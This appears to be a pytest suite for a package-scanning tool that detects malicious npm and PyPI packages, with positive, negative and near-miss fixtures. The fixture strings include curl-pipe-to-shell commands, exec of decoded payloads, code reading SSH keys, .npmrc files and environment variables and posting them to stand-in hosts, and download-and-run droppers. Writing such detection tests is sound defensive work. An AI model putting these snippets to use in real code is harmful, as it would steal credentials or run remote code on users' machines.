"""Content detectors: a true positive, a true negative and a near miss each."""

import base64
import hashlib
import json

import pytest

from pkgwatch.detectors import binaries, exfil, install_hooks, obfuscation, python_ast
from pkgwatch.detectors.install_hooks import _classify

SETUP = "demo-1.0.0/setup.py"


def pkg(scripts=None, **extra):
    return json.dumps({"name": "demo", "version": "1.0.0", "scripts": scripts or {}, **extra})


def random_b64(length: int) -> str:
    """Deterministic high-entropy text."""
    out, seed = b"", b"pkgwatch"
    while len(out) < length:
        seed = hashlib.sha256(seed).digest()
        out += base64.b64encode(seed)
    return out[:length].decode()


# ---------------------------------------------------------------- npm install hooks


@pytest.mark.parametrize(
    ("command", "kind"),
    [
        ("curl -s https://example.invalid/i.sh | sh", "risky"),
        ("wget https://example.invalid/x -O /tmp/x", "risky"),
        ("powershell -enc AAAA", "risky"),
        ("bash -c 'id'", "risky"),
        ("node -e \"require('child_process')\"", "risky"),
        ("node-gyp rebuild && curl https://example.invalid", "risky"),
        ("node install.js", "node-file"),
        ("node scripts/a.cjs && node scripts/b.cjs", "node-file"),
        ("./configure --fast", "plain"),
        ("node-gyp rebuild", "benign"),
        ("node-gyp-build || node-gyp rebuild", "benign"),
        ("prebuild-install || node-gyp rebuild", "benign"),
        ("husky install", "benign"),
        ("is-ci || husky install", "benign"),
        ("echo thanks && exit 0", "benign"),
        ("npm run build", "benign"),
        ("patch-package", "benign"),
    ],
)
def test_classify_install_commands(command, kind):
    assert _classify(command) == kind


def test_install_hook_true_positive_levels(make_ctx):
    risky = make_ctx(
        files={"package/package.json": pkg({"postinstall": "curl https://example.invalid | sh"})}
    )
    (finding,) = install_hooks.detect_install_hooks(risky)
    assert finding.id == "npm-install-hook" and finding.severity == "high" and finding.weight == 40
    assert finding.evidence.path == "package.json" and "postinstall" in finding.evidence.snippet

    node = make_ctx(manifest={"scripts": {"preinstall": "node setup.js"}})
    assert install_hooks.detect_install_hooks(node)[0].weight == 25

    plain = make_ctx(manifest={"scripts": {"install": "./configure"}})
    assert install_hooks.detect_install_hooks(plain)[0].weight == 12


def test_install_hook_negatives_and_near_misses(make_ctx):
    # Near miss: a native addon's routine build hook.
    assert (
        install_hooks.detect_install_hooks(
            make_ctx(manifest={"scripts": {"install": "node-gyp rebuild"}})
        )
        == []
    )
    # Scripts that do not run at install time.
    other = make_ctx(
        manifest={"scripts": {"test": "curl https://example.invalid", "prepare": "node x.js"}}
    )
    assert install_hooks.detect_install_hooks(other) == []
    assert install_hooks.detect_install_hooks(make_ctx()) == []
    assert install_hooks.detect_install_hooks(make_ctx(manifest={"scripts": "nope"})) == []
    assert install_hooks.detect_install_hooks(make_ctx(manifest={"scripts": {"install": ""}})) == []
    # The detector is npm-only.
    pypi = make_ctx("pypi", files={"package.json": pkg({"postinstall": "curl x | sh"})})
    assert install_hooks.detect_install_hooks(pypi) == []


def test_package_json_falls_back_to_archive_and_survives_bad_json(make_ctx):
    ctx = make_ctx(files={"package/package.json": "{not json", "package/lib/package.json": pkg()})
    assert ctx.package_json == {}
    assert make_ctx(files={"package/package.json": "[1, 2]"}).package_json == {}


# ---------------------------------------------------------------- setup.py (AST)


def setup_findings(make_ctx, source, path=SETUP):
    ctx = make_ctx("pypi", "demo", files={path: source}, archive_kinds=["sdist"])
    return python_ast.detect_setup_code(ctx)


@pytest.mark.parametrize(
    ("source", "weight", "phrase"),
    [
        ("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n", 45, "decoded or downloaded"),
        (
            "import urllib.request as u\nexec(u.urlopen('https://example.invalid/x').read())\n",
            45,
            "decoded",
        ),
        ("exec('" + "A" * 220 + "')\n", 45, "decoded"),
        ("code = make()\nexec(code)\n", 30, "dynamically built"),
        ("eval(input())\n", 30, "dynamically built"),
        ("import os\nos.system('curl https://example.invalid | sh')\n", 25, "starts a process"),
        ("from os import system as run\nrun('whoami')\n", 25, "starts a process"),
        ("__import__('os').system('id')\n", 25, "starts a process"),
        ("import subprocess\nsubprocess.Popen(['pip', 'install', 'x'])\n", 25, "starts a process"),
        ("import subprocess as sp\nsp.check_output(cmd, shell=True)\n", 25, "starts a process"),
        (
            "import urllib.request\nurllib.request.urlopen('https://example.invalid')\n",
            25,
            "network",
        ),
        (
            "from urllib.request import urlretrieve\nurlretrieve('https://example.invalid/a', 'a')\n",
            25,
            "network",
        ),
        ("import requests\nrequests.post('https://example.invalid', data={})\n", 25, "network"),
        ("import socket\ns = socket.socket()\n", 25, "network"),
        ("import zlib\nblob = zlib.decompress(data)\n", 15, "decodes"),
        (
            "import os\nopen(os.path.expanduser('~/.bashrc'), 'a').write('x')\n",
            15,
            "outside the build",
        ),
        ("open('/etc/cron.d/job', 'w')\n", 15, "outside the build"),
        ("import os\nopen(os.environ['APPDATA'] + '/x.bat', 'w')\n", 15, "outside the build"),
        ("import shutil\nshutil.copy('a', '/usr/local/bin/a')\n", 15, "outside the build"),
        (
            "from setuptools.command.install import install\nclass Post(install):\n    def run(self):\n        pass\n",
            15,
            "overrides",
        ),
        (
            "from setuptools.command import develop\nclass Dev(develop.develop):\n    pass\n",
            15,
            "overrides",
        ),
    ],
)
def test_setup_py_true_positives(make_ctx, source, weight, phrase):
    findings = setup_findings(make_ctx, source)
    assert findings, source
    assert all(f.id == "python-install-code" for f in findings)
    top = max(findings, key=lambda f: f.weight)
    assert top.weight == weight and phrase in top.message
    assert top.evidence.path.startswith(SETUP + ":")


@pytest.mark.parametrize(
    ("source", "why"),
    [
        ("from setuptools import setup\nsetup(name='demo')\n", "plain setup"),
        ("about = {}\nexec(open('demo/version.py').read(), about)\n", "version-file idiom"),
        (
            "with open('demo/version.py') as f:\n    exec(f.read())\n",
            "version-file idiom with a handle",
        ),
        ("exec(compile(open('v.py').read(), 'v.py', 'exec'))\n", "compile + open idiom"),
        ("from pathlib import Path\nexec(Path('v.py').read_text())\n", "pathlib idiom"),
        ("import subprocess\nsubprocess.check_output(['git', 'describe'])\n", "git version lookup"),
        ("import os\nos.system('cmake --build .')\n", "build tool"),
        (
            "import subprocess\nsubprocess.run(f'make -j{n}', shell=True)\n",
            "build tool via f-string",
        ),
        ("open('README.md', 'w')\n", "relative write"),
        ("open('/etc/hostname')\n", "read, not write"),
        ("open('/etc/hostname', 'r')\n", "read mode"),
        ("import shutil\nshutil.copy('a', 'build/a')\n", "copy inside the tree"),
        (
            "from setuptools.command.build_ext import build_ext\nclass B(build_ext):\n    pass\n",
            "custom build_ext",
        ),
        ("def exec_(x):\n    return x\nexec_('1')\n", "look-alike function name"),
        ("print 'python 2 syntax'\n", "unparseable source"),
    ],
)
def test_setup_py_negatives_and_near_misses(make_ctx, source, why):
    assert setup_findings(make_ctx, source) == [], why


def test_only_install_time_setup_py_is_analysed(make_ctx):
    risky = "import os\nos.system('id')\n"
    # Near miss: subprocess use in a runtime CLI module of a legitimate package.
    cli = make_ctx(
        "pypi",
        "demo",
        files={"demo-1.0.0/demo/cli.py": "import subprocess\nsubprocess.run(['ls'])\n"},
    )
    assert python_ast.detect_setup_code(cli) == []
    # A module called setup.py inside a wheel package directory never runs at install.
    assert setup_findings(make_ctx, risky, "demo_client/setup.py") == []
    assert setup_findings(make_ctx, risky, "demo-1.0.0/src/demo/setup.py") == []
    assert len(setup_findings(make_ctx, risky, "setup.py")) == 1
    marked = make_ctx("pypi", "demo", files={"src/setup.py": risky, "src/PKG-INFO": "Name: demo"})
    assert len(python_ast.detect_setup_code(marked)) == 1


def test_setup_py_reports_each_category_once(make_ctx):
    source = "import os\nos.system('a')\nos.system('b')\nos.popen('c')\n"
    assert len(setup_findings(make_ctx, source)) == 1


def test_deeply_nested_source_does_not_crash(make_ctx):
    assert setup_findings(make_ctx, "x = " + "(" * 3000 + "1" + ")" * 3000 + "\n") == []


def test_pth_files(make_ctx):
    evil = make_ctx("pypi", "demo", files={"demo.pth": "# c\nimport os; os.system('id')\n"})
    (finding,) = python_ast.detect_pth_files(evil)
    assert finding.id == "python-install-code" and finding.weight == 30
    assert finding.evidence.path == "demo.pth"
    benign = {
        "paths.pth": "../lib\n./src\n",
        "demo-nspkg.pth": "import sys, types, os;has_mfs = True\n",
        "_virtualenv.pth": "import _virtualenv\n",
        "__editable__.demo.pth": "import __editable___demo_finder; __editable___demo_finder.install()\n",
        "distutils-precedence.pth": "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = 1\n",
    }
    assert python_ast.detect_pth_files(make_ctx("pypi", "demo", files=benign)) == []
    assert python_ast.detect_pth_files(make_ctx("pypi", "demo")) == []


# ---------------------------------------------------------------- obfuscation


def kinds(findings):
    return sorted(f.weight for f in findings)


@pytest.mark.parametrize(
    "source",
    [
        "eval(atob('Y29uc29sZS5sb2coMSk='))",
        "new Function(Buffer.from(data, 'hex').toString())()",
        "eval(function(p,a,c,k,e,d){return p}('0 1',2,2,'a|b'.split('|'),0,{}))",
        "exec(zlib.decompress(base64.b64decode(blob)))",
        "exec(base64.b64decode(blob))",
        "exec(__import__('base64').b64decode(blob))",
        "eval(compile(base64.b64decode(blob), 'x', 'exec'))",
        "exec(''.join(chr(c) for c in codes))",
        "exec(bytes.fromhex(blob))",
        "exec(marshal.loads(blob))",
    ],
)
def test_obfuscated_exec_true_positives(make_ctx, source):
    path = (
        "package/index.js"
        if "Function" in source or "atob" in source or "p,a,c,k" in source
        else "pkg/a.py"
    )
    (finding,) = obfuscation.detect_obfuscation(make_ctx(files={path: source}))
    assert finding.id == "obfuscation" and finding.severity == "high" and finding.weight == 45


def test_hex_identifier_obfuscation(make_ctx):
    source = ";".join(f"var _0x{i:04x}=_0x{i + 100:04x}({i})" for i in range(30))
    (finding,) = obfuscation.detect_obfuscation(make_ctx(files={"package/i.js": source}))
    assert finding.weight == 45
    few = "var _0xabcd = 1; var _0x1234 = 2;"
    assert obfuscation.detect_obfuscation(make_ctx(files={"package/i.js": few})) == []


def test_charcode_chains(make_ctx):
    js = "var s = String.fromCharCode(" + ", ".join(str(100 + i) for i in range(20)) + ");"
    assert kinds(obfuscation.detect_obfuscation(make_ctx(files={"package/i.js": js}))) == [20]
    py = "s = " + " + ".join(f"chr({100 + i})" for i in range(12))
    assert kinds(obfuscation.detect_obfuscation(make_ctx(files={"pkg/a.py": py}))) == [20]
    many = "\n".join(f"x += String.fromCharCode(v{i});" for i in range(14))
    assert kinds(obfuscation.detect_obfuscation(make_ctx(files={"package/i.js": many}))) == [20]
    # Near miss: ordinary single-character conversions.
    normal = "var c = String.fromCharCode(code); var d = String.fromCharCode(65, 66);"
    assert obfuscation.detect_obfuscation(make_ctx(files={"package/i.js": normal})) == []


def test_high_entropy_string_and_encoded_blob(make_ctx):
    entropy = make_ctx(files={"package/i.js": f'var k = "{random_b64(400)}";'})
    (finding,) = obfuscation.detect_obfuscation(entropy)
    assert finding.weight == 12 and "entropy" in finding.message
    hex_blob = make_ctx(files={"pkg/a.py": f'DATA = "{"deadbeef00112233" * 60}"'})
    (finding,) = obfuscation.detect_obfuscation(hex_blob)
    assert finding.weight == 8 and "blob" in finding.message
    assert obfuscation.shannon_entropy(random_b64(400)) > 5.0
    assert obfuscation.shannon_entropy("aaaa") == 0.0 and obfuscation.shannon_entropy("") == 0.0


@pytest.mark.parametrize(
    ("path", "source", "why"),
    [
        (
            "package/i.js",
            'var img = "data:image/png;base64,' + random_b64(600) + '";',
            "inline image",
        ),
        (
            "package/i.js",
            "//# sourceMappingURL=data:application/json;base64," + random_b64(600),
            "source map",
        ),
        ("package/i.js", 'var pad = "' + "A" * 600 + '";', "repeated padding"),
        ("package/i.js", 'var s = "' + "a short sentence with spaces. " * 20 + '";', "prose"),
        ("package/node_modules/dep/i.js", "eval(atob('x'))", "vendored dependency"),
        ("package/yarn.lock", "integrity sha512-" + random_b64(300), "lock file"),
        ("package/i.js", "const x = evaluate(input); executor(job);", "look-alike identifiers"),
    ],
)
def test_obfuscation_negatives_and_near_misses(make_ctx, path, source, why):
    assert obfuscation.detect_obfuscation(make_ctx(files={path: source})) == [], why


def test_bundles_are_ignored_in_large_packages_but_not_tiny_ones(make_ctx):
    minified = "!function(){" + "var a=1;function b(c){return c+a}" * 200 + "}();"
    blob = f'var k="{random_b64(400)}";'
    sources = {f"package/src/m{i}.js": "export const x = 1;\n" for i in range(8)}
    big = make_ctx(files={**sources, "package/dist/app.min.js": minified + blob})
    assert obfuscation.detect_obfuscation(big) == []
    tiny = make_ctx(files={"package/index.js": minified})
    (finding,) = obfuscation.detect_obfuscation(tiny)
    assert finding.weight == 10 and "tiny package" in finding.message


def test_obfuscation_counts_files_and_reports_each_subtype_once(make_ctx):
    files = {f"package/f{i}.js": "eval(atob('eA=='))" for i in range(3)}
    (finding,) = obfuscation.detect_obfuscation(make_ctx(files=files))
    assert "(in 3 files)" in finding.message


# ---------------------------------------------------------------- exfiltration


def test_credential_read_with_network_true_positives(make_ctx):
    py = "import os, requests\nkey = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nrequests.post('https://example.invalid', data=key)\n"
    (finding,) = exfil.detect_exfiltration(make_ctx("pypi", files={"pkg/a.py": py}))
    assert finding.id == "exfiltration" and finding.severity == "high" and finding.weight == 40
    assert "id_rsa" in finding.evidence.snippet
    js = "const https = require('https');\nconst t = fs.readFileSync(os.homedir() + '/.npmrc');\nhttps.request(u).end(t);\n"
    assert exfil.detect_exfiltration(make_ctx(files={"package/i.js": js}))[0].weight == 40
    wallet = "import requests, shutil\nshutil.copy(home + '/Electrum/wallets/default', tmp)\nrequests.post(u, files=f)\n"
    assert exfil.detect_exfiltration(make_ctx("pypi", files={"pkg/a.py": wallet}))[0].weight == 40


def test_environment_dump_with_network(make_ctx):
    js = "fetch('https://example.invalid', {method: 'POST', body: JSON.stringify(process.env)});"
    (finding,) = exfil.detect_exfiltration(make_ctx(files={"package/i.js": js}))
    assert finding.severity == "medium" and finding.weight == 30
    py = "import os, requests\nrequests.post('https://example.invalid', data=os.environ)\n"
    assert exfil.detect_exfiltration(make_ctx("pypi", files={"pkg/a.py": py}))[0].weight == 30


@pytest.mark.parametrize(
    ("path", "source", "why"),
    [
        (
            "pkg/a.py",
            "import os\nkey = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n",
            "no network",
        ),
        (
            "pkg/a.py",
            "import re, requests\nDENY = re.compile(r'\\.ssh/id_rsa|\\.aws/credentials|\\.npmrc')\nrequests.get(u)\n",
            "deny-list of sensitive names, nothing read",
        ),
        (
            "pkg/a.py",
            "import os, subprocess\nfrom urllib.request import urlopen\nenv = os.environ.copy()\nsubprocess.run(c, env=env)\nurlopen(u)\n",
            "environment copied for a subprocess",
        ),
        (
            "package/i.js",
            "const t = process.env.API_TOKEN;\nfetch(url, {headers: {Authorization: t}});",
            "single named variable",
        ),
        (
            "package/test/steal.test.js",
            "const k = fs.readFileSync('/home/u/.ssh/id_rsa'); fetch('https://example.invalid', {body: k});",
            "test file",
        ),
        (
            "package/i.js",
            "const logins = readFileSync('test-tenant-logins.json'); fetch(u);",
            "similar file name",
        ),
    ],
)
def test_exfiltration_negatives_and_near_misses(make_ctx, path, source, why):
    assert exfil.detect_exfiltration(make_ctx(files={path: source})) == [], why


# ---------------------------------------------------------------- suspicious endpoints


@pytest.mark.parametrize(
    ("url", "label"),
    [
        ("https://discord.com.example.invalid/api/webhooks/123/abc-DEF", "Discord webhook"),
        ("https://discordapp.com.example.invalid/api/webhooks/123/abc", "Discord webhook"),
        ("https://api.telegram.org.example.invalid/bot123:ABC/sendMessage", "Telegram bot API"),
        ("https://a1b2c3d4.ngrok.io.example.invalid/x", "ngrok tunnel"),
        ("https://abc-123.ngrok-free.app.example.invalid/", "ngrok tunnel"),
        ("https://eo123abc.m.pipedream.net.example.invalid", "Pipedream endpoint"),
        ("c1a2b3.oast.fun.example.invalid", "out-of-band interaction host"),
        ("xyz123.burpcollaborator.net.example.invalid", "out-of-band interaction host"),
        ("https://webhook.site/1111-2222", "request-capture service"),
        ("https://pastebin.com/raw/AbCd1234", "paste or file-drop host"),
    ],
)
def test_suspicious_endpoint_true_positives(make_ctx, url, label):
    ctx = make_ctx(files={"package/index.js": f'const target = "{url}";'})
    (finding,) = exfil.detect_suspicious_endpoints(ctx)
    assert finding.id == "suspicious-endpoint" and finding.weight == 30
    assert label in finding.message


def test_raw_ip_urls(make_ctx):
    ctx = make_ctx(files={"package/index.js": 'fetch("http://203.0.113.7:8080/collect")'})
    (finding,) = exfil.detect_suspicious_endpoints(ctx)
    assert finding.weight == 20 and "raw IP" in finding.message
    both = make_ctx(
        files={
            "package/package.json": '{"u": "http://198.51.100.9/a", "w": "https://x1y2z3.ngrok.io.example.invalid"}'
        }
    )
    assert sorted(f.weight for f in exfil.detect_suspicious_endpoints(both)) == [20, 30]


@pytest.mark.parametrize(
    ("source", "why"),
    [
        ('fetch("http://127.0.0.1:3000/health")', "loopback"),
        (
            'fetch("http://192.168.1.10/api"); fetch("http://10.0.0.5/"); fetch("http://0.0.0.0:80/")',
            "private",
        ),
        ('const v = "http://999.1.1.1/x";', "not an address"),
        ('const API = "https://discord.com/api/v10/channels";', "normal Discord API"),
        (
            'const blocked = ["ngrok.io", "pipedream.net", "oast.fun"];',
            "bare host names in a deny-list",
        ),
        ('const docs = "https://example.com/pastebin-guide";', "word in a path"),
        ('const version = "1.2.3.4";', "version string"),
    ],
)
def test_suspicious_endpoint_negatives_and_near_misses(make_ctx, source, why):
    assert exfil.detect_suspicious_endpoints(make_ctx(files={"package/index.js": source})) == [], (
        why
    )


def test_endpoints_in_test_files_are_ignored(make_ctx):
    ctx = make_ctx(files={"package/test/hook.spec.js": 'x = "https://webhook.site/abc-123"'})
    assert exfil.detect_suspicious_endpoints(ctx) == []


# ---------------------------------------------------------------- binaries and droppers

PE = b"MZ" + b"\x00" * 126
ELF = b"\x7fELF" + b"\x00" * 124
MACHO = b"\xcf\xfa\xed\xfe" + b"\x00" * 60


def test_unexpected_binaries_true_positives(make_ctx):
    ctx = make_ctx(
        "pypi",
        "demo",
        files={"demo/helper.exe": PE, "demo/__init__.py": ""},
        archive_kinds=["sdist"],
    )
    (finding,) = binaries.detect_binaries(ctx)
    assert finding.id == "binary-dropper" and finding.weight == 20
    assert "helper.exe (Windows PE)" in finding.evidence.snippet
    # Detected by magic bytes even with an innocent extension.
    disguised = make_ctx(files={"package/assets/logo.png": ELF})
    assert "ELF" in binaries.detect_binaries(disguised)[0].evidence.snippet
    many = make_ctx(files={f"package/b{i}.dll": PE for i in range(5)})
    assert "and 2 more" in binaries.detect_binaries(many)[0].evidence.snippet
    assert binaries.binary_kind(MACHO) == "Mach-O" and binaries.binary_kind(b"MZ") is None


@pytest.mark.parametrize(
    ("kwargs", "why"),
    [
        (
            {"ecosystem": "pypi", "files": {"p/_x.so": ELF}, "archive_kinds": ["wheel:platform"]},
            "platform wheel",
        ),
        (
            {"files": {"package/app.exe": PE}, "manifest": {"os": ["win32"], "cpu": ["x64"]}},
            "declares os/cpu",
        ),
        ({"files": {"package/prebuilds/linux-x64/a.so": ELF}}, "prebuilds directory"),
        ({"files": {"package/binding.gyp": "{}", "package/build/x.so": ELF}}, "node-gyp project"),
        ({"name": "@tool/linux-x64", "files": {"package/tool": ELF}}, "platform package name"),
        ({"files": {"package/addon.node": MACHO}}, "native addon"),
        (
            {"ecosystem": "pypi", "files": {"setuptools/cli-64.exe": PE, "pip/t64.exe": PE}},
            "launcher stubs",
        ),
        ({"files": {"package/readme.txt": b"MZ is a great band"}}, "text starting with MZ"),
        ({"files": {"package/index.js": "module.exports = 1"}}, "no binaries"),
    ],
)
def test_binaries_negatives_and_near_misses(make_ctx, kwargs, why):
    assert binaries.detect_binaries(make_ctx(**kwargs)) == [], why


def test_download_and_execute_true_positives(make_ctx):
    py = (
        "import os, subprocess, urllib.request\n"
        "urllib.request.urlretrieve('https://example.invalid/a', '/tmp/update.sh')\n"
        "os.chmod('/tmp/update.sh', 0o755)\nsubprocess.run(['/tmp/update.sh'])\n"
    )
    (finding,) = binaries.detect_download_execute(make_ctx("pypi", files={"pkg/a.py": py}))
    assert finding.id == "binary-dropper" and finding.weight == 35
    assert "urlretrieve" in finding.evidence.snippet
    shell = "#!/bin/sh\ncurl -fsSL https://example.invalid/install | bash\n"
    assert len(binaries.detect_download_execute(make_ctx(files={"package/setup.sh": shell}))) == 1
    js = (
        'const out = path.join(os.tmpdir(), "svc.exe");\n'
        'https.get("https://example.invalid/svc", (r) => r.pipe(fs.createWriteStream(out)));\n'
        "execFile(out);\n"
    )
    assert len(binaries.detect_download_execute(make_ctx(files={"package/i.js": js}))) == 1


@pytest.mark.parametrize(
    ("path", "source", "why"),
    [
        (
            "package/dev.js",
            'const s = { async fetch(req) { return fetch("https://example.invalid/x"); } };\n'
            'spawn("node", ["build.js"]);\nconst hooks = ["pre-commit.sh"];\n',
            "fetch then spawn of an interpreter; script name appears later",
        ),
        (
            "pkg/a.py",
            "import requests\nr = requests.get('https://example.invalid/data.json')\nprint(r.json())\n",
            "download only",
        ),
        ("pkg/a.py", "import subprocess\nsubprocess.run(['./tool.sh'])\n", "run only"),
        (
            "pkg/a.py",
            "import requests\nrequests.get(u)\n"
            + "x = 1\n" * 400
            + "import subprocess\nsubprocess.run(['a.sh'])\n",
            "download and run far apart",
        ),
        (
            "package/examples/install.sh",
            "curl https://example.invalid/i | sh\n",
            "example directory",
        ),
    ],
)
def test_download_and_execute_negatives_and_near_misses(make_ctx, path, source, why):
    assert binaries.detect_download_execute(make_ctx(files={path: source})) == [], why


def test_unsafe_archive(make_ctx):
    ctx = make_ctx(archive_error="unsafe: path traversal in archive: '../x'")
    (finding,) = binaries.detect_unsafe_archive(ctx)
    assert finding.id == "unsafe-archive" and finding.severity == "high" and finding.weight == 40
    assert binaries.detect_unsafe_archive(make_ctx(archive_error="skipped: too large")) == []
    assert binaries.detect_unsafe_archive(make_ctx()) == []


# ---------------------------------------------------------------- context


def test_scan_code_is_bounded_and_prefers_shallow_small_files(make_ctx, config):
    per_file = config.limits["max_scan_file_bytes"]
    total = config.limits["max_scan_bytes"]
    files = {"package/a/b/c/deep.js": "d" * 10, "package/top.js": "t" * (per_file + 500)}
    files.update({f"package/lib/big{i:02d}.js": "x" * per_file for i in range(20)})
    ctx = make_ctx(files=files)
    scanned = ctx.scan_code
    assert next(iter(scanned)) == "package/top.js" and len(scanned["package/top.js"]) == per_file
    assert sum(len(t) for t in scanned.values()) <= total
    assert "package/a/b/c/deep.js" not in scanned  # budget ran out before the deepest file


def test_binary_and_non_code_files_are_not_treated_as_text(make_ctx):
    ctx = make_ctx(
        files={"package/a.js": b"\x00\x01binary", "package/data.json": "{}", "package/b.py": "x=1"}
    )
    assert set(ctx.texts) == {"package/data.json", "package/b.py"}
    assert set(ctx.code) == {"package/b.py"}
    assert ctx.total_code_bytes == 3 and ctx.key == "npm/example-pkg/1.2.3"
